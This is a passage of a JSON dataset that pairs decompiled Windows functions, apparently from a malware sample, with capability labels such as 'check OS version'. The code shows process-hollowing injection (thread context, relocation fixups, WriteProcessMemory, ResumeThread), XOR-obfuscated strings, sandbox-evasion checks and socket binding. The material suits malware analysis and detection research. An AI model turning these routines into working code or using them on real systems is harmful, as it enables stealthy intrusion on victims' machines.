0, &stack0xfffffc9c, &stack0xfffffc80),  iVar14 == 0)\n    {\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    }\n    puVar16 = NULL;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, unaff_EDI);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uStack804 = 0x10002;\n    puVar5 = piStack1008[0xf] + piStack1008;\n    puStack992 = puVar5;\n    iVar14 = (*_sym.imp.KERNEL32.dll_GetThreadContext)(uStack900, &stack0xfffffcdc);\n    if (iVar14 != 0) {\n        piStack1008 = *(puVar5 + 0x50);\n        iVar14 = fcn.0040f995(&stack0xfffffc2c);\n        if ((iVar14 == 0) && (iVar14 = fcn.0040f6f4(&stack0xfffffc64),  iVar14 == 0)) {\n            puVar12 = puStack984;\n            if (puStack984 != NULL) {\n                for (; piStack1008 != NULL; piStack1008 = piStack1008 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\n                puVar12 = puVar16;\n                puVar15 = puStack984;\n                for (iVar11 = *(puVar5 + 0x54); iVar11 != 0; iVar11 = iVar11 + -1) {\n                    *puVar15 = *puVar12;\n                    puVar12 = puVar12 + 1;\n                    puVar15 = puVar15 + 1;\n                }\n                uStack1004 = 0;\n                if (*(puVar5 + 6) != 0) {\n                    piVar8 = puVar5 + *(puVar5 + 0x14) + 0x24;\n                    do {\n                        iVar11 = piVar8[1];\n                        if (iVar11 != 0) {\n                            puVar12 = puVar16 + *piVar8;\n                            puVar15 = puStack984 + *piVar8;\n                            for (; iVar11 != 0; iVar11 = iVar11 + -1) {\n                                *puVar15 = *puVar12;\n                                puVar12 = puVar12 + 1;\n                                puVar15 = puVar15 + 1;\n                            }\n                        }\n                        piVar8 = piVar8 + 10;\n                        uStack1004 = uStack1004 + 1;\n                    } while (uStack1004 < *(puVar5 + 6));\n                }\n                iVar11 = 0xa0;\n                if (*(puVar5 + 4) == -0x799c) {\n                    iVar11 = 0xb0;\n                }\n                iVar14 = *(puVar5 + 0x34);\n                uStack896 = uStack924 - *(puVar5 + 0x34);\n                iStack892 = (uStack924 >> 0x1f) - (uStack924 < *(puVar5 + 0x34));\n                piStack1008 = puVar16 + *(puVar5 + iVar11);\n                if ((*(puVar5 + iVar11) != 0) && (uStack976 = *(puVar5 + iVar11 + 4),  uStack976 != 0)) {\n                    for (; 8 < uStack976; uStack976 = uStack976 - *piVar8) {\n                        uStack1004 = piStack1008[1] - 8U >> 1;\n                        iVar11 = *piStack1008;\n                        if ((piStack1008[1] <= uStack976) && (uStack1004 != 0)) {\n                            piVar8 = piStack1008 + 2;\n                            uVar13 = uStack1004;\n                            do {\n                                uVar2 = *piVar8;\n                                if (uVar2 >> 0xc == 3) {\n                                    *(puStack984 + (uVar2 & 0xfff) + iVar11) =\n                                         *(puStack984 + (uVar2 & 0xfff) + iVar11) + (uStack924 - iVar14);\n                                }\n                                else if (uVar2 >> 0xc == 10) {\n                                    uVar9 = uVar2 & 0xfff;\n                                    puVar1 = puStack984 + uVar9 + iVar11;\n                                    uVar3 = *puVar1;\n                                    *puVar1 = *puVar1 + uStack896;\n                                    *(puStack984 + uVar9 + 4 + iVar11) =\n                                         *(puStack984 + uVar9 + 4 + iVar11) + iStack892 + CARRY4(uVar3, uStack896);\n                                }\n                                piVar8 = piVar8 + 2;\n                                uVar13 = uVar13 - 1;\n                            } while (uVar13 != 0);\n                        }\n                        piVar8 = piStack1008 + 1;\n                        piStack1008 = piStack1008 + piStack1008[1];\n                        puVar5 = uStack1000;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n                iVar14 = *(puVar5 + 0x28);\n                iVar6 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(uStack916, iStack652 + 8, &stack0xfffffc84, 4, 0);\n                pcVar4 = _sym.imp.KERNEL32.dll_IsBadReadPtr;\n                iVar11 = uStack916;\n                if (iVar6 != 0) {\n                    iStack920 = 1;\n                    iVar11 = (*_sym.imp.KERNEL32.dll_IsBadReadPtr)(&stack0xfffffc20, 1);\n                    if (iVar11 == 0) {\n                        uStack1000._0_1_ = 0xe9;\n                    }\n                    uStack1000 = uStack1000 & 0xffffff00 | uStack1000;\n                    iVar11 = (*pcVar4)(&stack0xfffffc19, 4);\n                    if (iVar11 == 0) {\n                        uVar13 = (iVar14 - iStack636) + 0x6f54696b;\n                        piStack1008 = piStack1008 & 0xff | uVar13 * 0x100;\n                        uStack1004 = uStack1004 & 0xffffff00 | uVar13 >> 0x18;\n                    }\n                    iVar11 = 0;\n                    do {\n                        iVar14 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                           (0x6f546970, iVar11 + iStack652, &stack0xfffffc10 + iVar11, unaff_EBX, 0);\n                        if (iVar14 == 0) break;\n                        iVar11 = iVar11 + 1;\n                    } while (iVar11 < 5);\n                    (*_sym.imp.KERNEL32.dll_ResumeThread)(uStack924);\n                    iVar11 = uStack916;\n                }\n                goto code_r0x0040a088;\n            }\n        }\n        else {\ncode_r0x0040a088:\n            if (puStack984 != NULL) {\n                fcn.0040f859();\n            }\n        }\n        if (iStack980 != 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack980);\n        }\n        if (iStack920 != 0) goto code_r0x0040a0cf;\n    }\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack912, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack920);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack920);\ncode_r0x0040a0cf:\n    uVar7 = uStack912;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar10);\n    return uVar7;\n}\n",
        "token_count": 3245
    },
    "0040b9e6": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040b9e6(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    puVar9 = &var_20h;\n    for (iVar7 = 8; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_2ch = 0x2723235b;\n    var_28h = 0x2b331b59;\n    var_24h = CONCAT22(var_24h._2_2_, 0x3527);\n    var_18h = 0x4b475735;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x35);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    lpModuleName = iVar7;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar4 != 0xf36b49) {\n            var_8h = 5;\n            *(iVar8 + iVar7) = *(&var_18h + iVar8 % 5) ^ (iVar8 + iVar7)[&var_2ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_30h = 0x16383f30;\n    var_2ch = 0x3e122725;\n    var_28h = 0x38093020;\n    var_24h = 0x55667801;\n    var_18h = 0x55544b62;\n    var_14h._0_2_ = 0x4a4a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_30h - iVar7;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        iVar4 = lpModuleName;\n        if (iVar5 != 0xb06fb3) {\n            var_8h = 6;\n            *(iVar8 + iVar7) = *(&var_18h + iVar8 % 6) ^ (iVar8 + iVar7)[&var_30h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x10);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar7);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    cVar2 = fcn.00403e17();\n    if (cVar2 != '\\0') {\n        var_4h = (*pcVar6)(0, var_1ch, var_20h);\n    }\n    fcn.0040482b();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*pcVar6)(uVar3);\n    return var_4h;\n}\n",
        "token_count": 962
    },
    "0040bf00": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040bf00(void)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = *0x41cd20;\n    fcn.0040f5d9();\n    uVar2 = fcn.0040f5d9();\n    iVar3 = fcn.0040bb40(uVar2 & 0xff, 0x41cd20, 0x41cd24, &var_8h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.0040bb40(0, 0x41cd20, 0x41cd28, &var_8h);\n        if (iVar3 != 0) {\n            var_24h = 0x41564d43;\n            var_20h = 0x33286d35;\n            var_1ch._0_2_ = 0x4d41;\n            var_18h = 0x41334d6d;\n            var_14h._0_1_ = 0x4d;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n                if (iVar5 != 0x421007) {\n                    var_10h = 5;\n                    *(iVar6 + iVar3) = *(&var_18h + iVar6 % 5) ^ (iVar6 + iVar3)[&var_24h - iVar3];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x41cd28, iVar3);\n            iVar6 = fcn.0040bb40(0, 0x41cd20, 0x41cd38, &var_8h);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar6 != 0) {\n                var_4h = var_4h ^ 0x29787279;\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar6 = fcn.0040bb40(0, &var_4h, 0x41cd2c, &var_8h);\n                if (iVar6 != 0) {\n                    var_ch = 1;\n                }\n            }\n            uVar4 = (*pcVar1)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 711
    },
    "0040c055": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040c055(void)\n\n{\n    int16_t iVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int16_t *piVar8;\n    code *pcVar9;\n    uchar *puVar10;\n    int32_t iVar11;\n    uint uStack1452;\n    uchar *puStack1448;\n    uchar *puStack1444;\n    uint uStack1440;\n    uint uStack1436;\n    uint uStack1432;\n    uint uStack1428;\n    int32_t iStack1424;\n    uchar *puStack1420;\n    uint uStack1416;\n    int32_t iStack1412;\n    uint uStack1408;\n    uchar *puStack1404;\n    uint uStack1400;\n    uchar *puStack1396;\n    uint uStack1392;\n    int32_t iStack1388;\n    uint uStack1384;\n    uint uStack1380;\n    uint uStack1376;\n    uchar *puStack1372;\n    uint uStack1368;\n    int32_t iStack1364;\n    uint uStack1348;\n    uint uStack1344;\n    uint uStack1340;\n    uint uStack1336;\n    uchar *puStack1332;\n    int32_t iStack1328;\n    uchar uStack1324;\n    uchar *puStack1316;\n    uint uStack1312;\n    uint uStack1300;\n    uint uStack1296;\n    uint uStack1292;\n    uint uStack1288;\n    uint uStack1284;\n    uint uStack1280;\n    uint uStack1276;\n    uint uStack1272;\n    int32_t iStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    uint uStack1256;\n    uint uStack1252;\n    uint uStack1248;\n    uint uStack1244;\n    uint uStack1240;\n    int32_t iStack1236;\n    uint uStack1232;\n    uint uStack1228;\n    uint uStack1224;\n    uint uStack1220;\n    uint uStack1216;\n    int32_t iStack1212;\n    ushort uStack1208;\n    uchar auStack1204 [8];\n    uint32_t uStack1196;\n    int32_t iStack1192;\n    int32_t iStack1180;\n    uint uStack1172;\n    uint uStack1168;\n    int32_t iStack1164;\n    uchar auStack1160 [4];\n    int32_t iStack1156;\n    uchar auStack1148 [8];\n    uint uStack1140;\n    int16_t iStack1136;\n    uchar auStack1134 [22];\n    uchar auStack1112 [4];\n    uchar auStack1108 [40];\n    uchar auStack1068 [36];\n    uchar auStack1032 [1028];\n    \n    pcVar9 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uStack1140 = 0x200;\n    uStack1336 = 0x5c11271a;\n    puVar10 = &stack0xfffffbf8;\n    for (iVar7 = 0x400; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    puStack1332 = 0x51711d37;\n    puVar10 = &stack0xfffffb90;\n    for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    iStack1364 = 0xe;\n    iStack1328 = 0x2e1d361c;\n    puVar10 = &stack0xfffffbd4;\n    for (iVar7 = 0x24; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    uStack1368 = 8;\n    uStack1324 = 99;\n    uStack1344 = 0x32634271;\n    uStack1340 = CONCAT31(uStack1340._1_3_, 0x52);\n    puStack1372 = 0x40c0cd;\n    puStack1372 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    uStack1376 = 0x40c0d4;\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1164 = 5;\n    uStack1312 = 0;\n    iVar11 = 0;\n    puStack1316 = &stack0xfffffabc + -iVar7;\n    iStack1156 = iVar7;\n    do {\n        uStack1376 = 0x40c100;\n        iVar3 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar3 != 0x8e2b06) {\n            *(iVar11 + iVar7) = (&stack0xfffffab4)[iVar11 % iStack1164] ^ (iVar11 + iVar7)[puStack1316];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xd);\n    uStack1376 = 0x15;\n    uStack1380 = 8;\n    uStack1348 = 0xf27370b;\n    uStack1344 = 0x24254126;\n    uStack1340 = 0x463e1236;\n    uStack1336 = 0x83e3738;\n    puStack1332 = 0x52235329;\n    uStack1384 = 0x40c164;\n    uStack1384 = (*pcVar9)();\n    iStack1388 = 0x40c16b;\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iStack1180 = 6;\n    iVar11 = 0;\n    puStack1332 = &stack0xfffffab0 + -iVar7;\n    iStack1328 = iVar7;\n    do {\n        iStack1388 = 0x40c190;\n        iVar3 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar3 != 0x4707f5) {\n            *(iVar11 + iVar7) = (&stack0xfffffaa8)[iVar11 % iStack1180] ^ (iVar11 + iVar7)[puStack1332];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x14);\n    uStack1392 = uStack1168;\n    puStack1396 = 0x40c1c6;\n    iStack1388 = iVar7;\n    puStack1396 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    uStack1400 = 0x40c1cd;\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uStack1172 = 0x40;\n    uStack1400 = &stack0xfffffb6c;\n    puStack1404 = 0x40c1e8;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)();\n    puStack1404 = &stack0xfffffbac;\n    if (pcVar4 == NULL) {\n        uStack1408 = 0x40c1fe;\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)();\n    }\n    else {\n        uStack1408 = 0x40c1f6;\n        (*pcVar4)();\n    }\n    uStack1408 = 0xbd;\n    iStack1412 = 8;\n    uStack1300 = 0x5a096918;\n    uStack1296 = 0x69346925;\n    uStack1292 = 0x69365a1f;\n    uStack1288 = 0x5a0d6922;\n    uStack1284 = 0x6914690b;\n    uStack1280 = 0x69045a2d;\n    uStack1276 = 0x5a3a6913;\n    uStack1272 = 0x6900691e;\n    iStack1268 = 0x691e5a3c;\n    uStack1264 = 0x5a26691f;\n    uStack1260 = 0x6903690b;\n    uStack1256 = 0x69245a11;\n    uStack1252 = 0x5a0d6924;\n    uStack1248 = 0x690c693a;\n    uStack1244 = 0x69325a2b;\n    uStack1240 = 0x5a1c693e;\n    iStack1236 = 0x69316925;\n    uStack1232 = 0x69075a04;\n    uStack1228 = 0x5a076922;\n    uStack1224 = 0x69356934;\n    uStack1220 = 0x69245a1b;\n    uStack1216 = 0x5a1a693f;\n    iStack1212 = 0x6960690b;\n    uStack1208 = 0x5a68;\n    iStack1388 = 0x5a686950;\n    uStack1384 = CONCAT22(uStack1384._2_2_, 0x6957);\n    uStack1416 = 0x40c311;\n    uStack1416 = (*pcVar9)();\n    puStack1420 = 0x40c318;\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    iVar11 = 0;\n    puStack1372 = &stack0xfffffae0 + -iVar7;\n    iStack1364 = iVar7;\n    do {\n        puStack1420 = 0x40c334;\n        iVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar3 != 0xa0c3ec) {\n            *(iVar11 + iVar7) = (&stack0xfffffa88)[iVar11 % iStack1212] ^ (iVar11 + iVar7)[&stack0xfffffae0 + -iVar7];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x5e);\n    puStack1420 = &stack0xfffffb4c;\n    uStack1428 = 0x80000002;\n    uStack1432 = 0x40c36b;\n    iStack1424 = iVar7;\n    iVar11 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyW)();\n    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    puVar10 = puStack1372;\n    if (iVar11 == 0) {\n        uStack1432 = 0x51;\n        uStack1436 = 8;\n        iStack1364 = 0x33017038;\n        uStack1348 = 0x70266339;\n        uStack1344 = 0x63263312;\n        uStack1340 = 0x3320700d;\n        uStack1336 = 0x701a633f;\n        puStack1332 = 0x6325331a;\n        iStack1328 = 0x3373700f;\n        puStack1404 = 0x33737068;\n        uStack1400 = CONCAT22(uStack1400._2_2_, 0x634b);\n        uStack1440 = 0x40c3e6;\n        uStack1440 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        puStack1444 = 0x40c3ed;\n        iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        iVar7 = 0;\n        iStack1424 = iVar11;\n        puStack1396 = &stack0xfffffaa0 + -iVar11;\n        do {\n            puStack1444 = 0x40c409;\n            iVar3 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n            if (iVar3 != 0x7c38be) {\n                *(iVar7 + iVar11) =\n                     (&stack0xfffffa78)[iVar7 % iStack1236] ^ (iVar7 + iVar11)[&stack0xfffffaa0 + -iVar11];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x28);\n        puStack1444 = &stack0xfffffb3c;\n        puStack1448 = &stack0xfffffba8;\n        uStack1452 = 0;\n        (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(uStack1228, iVar11, 0);\n        piVar8 = &stack0xfffffb90;\n        do {\n            iVar1 = *piVar8;\n            piVar8 = piVar8 + 1;\n        } while (iVar1 != puStack1404);\n        pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (piVar8 - &stack0xfffffb92 >> 1 != 0) {\n            iVar11 = 0x15;\n            uStack1440 = 0x52107132;\n            uStack1436 = 0x751f6a2e;\n            uStack1432 = CONCAT22(uStack1432._2_2_, 0x4152);\n            puStack1420 = 0x5275716a;\n            uStack1416 = CONCAT31(uStack1416._1_3_, 0x41);\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n            iVar3 = 0;\n            uStack1416 = &stack0xfffffa54 + -iVar7;\n            do {\n                iVar6 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                if (iVar6 != 0xf6b4b5) {\n                    *(iVar3 + iVar7) =\n                         (&stack0xfffffa68)[iVar3 % iStack1268] ^ (iVar3 + iVar7)[&stack0xfffffa54 + -iVar7];\n                }\n                pcVar9 = _sym.imp.SHLWAPI.dll_StrStrIW;\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 10);\n            iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&stack0xfffffb84, iVar7);\n            while (iVar3 != 0) {\n                (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n                iVar3 = (*pcVar9)(&stack0xfffffb78, iVar7);\n            }\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n        }\n        iVar7 = iStack1412;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack1252);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n        (*pcVar9)(uVar5);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        puVar10 = puStack1372;\n    }\n    while ((puVar2 = puStack1372,  _sym.imp.KERNEL32.dll_GetProcessHeap = pcVar4,  puStack1372 = puVar10, \n           iStack1192 == 0 && (uStack1196 < 2100000000))) {\n        uStack1432 = 10000;\n        uStack1436 = 0x40c574;\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n        pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        puVar10 = puStack1372;\n        puStack1372 = puVar2;\n    }\n    uStack1436 = 0;\n    uStack1440 = 0x40c59c;\n    uStack1432 = iVar7;\n    uStack1440 = (*pcVar4)();\n    puStack1444 = 0x40c59f;\n    (*pcVar9)();\n    puStack1444 = puVar2;\n    puStack1448 = NULL;\n    uStack1452 = 0x40c5a5;\n    uStack1452 = (*pcVar4)();\n    (*pcVar9)();\n    uVar5 = (*pcVar4)(0, iStack1236);\n    (*pcVar9)(uVar5);\n    return;\n}\n",
        "token_count": 3752
    },
    "0040c5e5": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040c5e5(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uStack492;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uint32_t uVar7;\n    uchar uStack464;\n    uchar uStack463;\n    ushort uStack462;\n    uint32_t uStack460;\n    uint uStack456;\n    uint uStack452;\n    uint32_t uStack448;\n    uchar auStack408 [404];\n    \n    uStack464 = unaff_EBX;\n    uStack463 = unaff_EBX >> 8;\n    uStack462 = unaff_EBX >> 0x10;\n    uStack476 = &stack0xfffffe68;\n    uVar6 = 0;\n    uStack480 = 0x202;\n    uStack484 = 0x40c606;\n    (*_sym.imp.WS2_32.dll_WSAStartup)();\n    uStack484 = 0;\n    uStack488 = 1;\n    uStack492 = 2;\n    uVar1 = (*_sym.imp.WS2_32.dll_socket)();\n    if (uVar1 != 0xffffffff) {\n        uStack448 = uVar1;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        uVar6 = iVar2 + 2000U & 0xffff;\n        uVar1 = 0;\n        if (uVar6 < 64000) {\n            uVar7 = 0x6a745c5a;\n            uStack452 = 6;\n            uStack464 = 0x72;\n            uStack463 = 0x44;\n            uStack480 = 0x44436e6b;\n            uStack476 = CONCAT22(uStack476._2_2_, 0x3136);\n            uStack460 = uVar6;\n            do {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                iVar5 = 0;\n                uVar6 = uVar7;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n                    uVar1 = uStack460;\n                    if (iVar4 != 0x5c5606) {\n                        *(iVar5 + iVar2) =\n                             (&stack0xfffffe14)[iVar5 % CONCAT22(uStack462, CONCAT11(uStack463, uStack464))] ^\n                             (iVar5 + iVar2)[&stack0xfffffe1c + -iVar2];\n                    }\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < 10);\n                uVar7 = uVar6;\n                uStack456 = (*_sym.imp.WS2_32.dll_inet_addr)(iVar2);\n                uStack462 = (*_sym.imp.WS2_32.dll_ntohs)(uVar6);\n                uStack464 = 2;\n                uStack463 = 0;\n                iVar5 = (*_sym.imp.WS2_32.dll_bind)(uVar1, &stack0xfffffe30, 0x10);\n                if (iVar5 == 0) {\n                    (*_sym.imp.WS2_32.dll_closesocket)(uVar1);\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                    uVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    break;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar6 = uVar6 + 1;\n                uVar1 = 0;\n                uStack460 = uVar6;\n            } while (uVar6 < 64000);\n        }\n    }\n    return uVar1 & 0xffff0000 | uVar6 & 0xffff;\n}\n",
        "token_count": 935
    },
    "0040c737": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c737(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_344h;\n    uint var_13ch;\n    uint var_fch;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    ushort var_9ch;\n    uchar var_9ah;\n    uint var_99h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    ushort var_44h;\n    uint var_42h;\n    uchar var_3dh;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    ushort var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_bch = 0x208;\n    iVar2 = fcn.0040be1a();\n    if (iVar2 == 0) {\n        fcn.0040c055();\n        fcn.0040a98b();\n        while ((iVar2 = fcn.0040b6b4(),  iVar2 != 0 || (iVar2 = fcn.0040b71e(),  iVar2 != 0))) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.QT_Y___, 0x184, 0x40, &var_ach);\n    if (iVar2 != 0) {\n        fcn.0040474a();\n        (*pcVar6)(str.QT_Y___, 0x184, var_ach, &var_ach);\n    }\n    puVar7 = 0x41cd40;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.0040e6ed();\n    puVar9 = &var_58h;\n    for (iVar2 = 0x1c; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    puVar9 = &var_b8h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        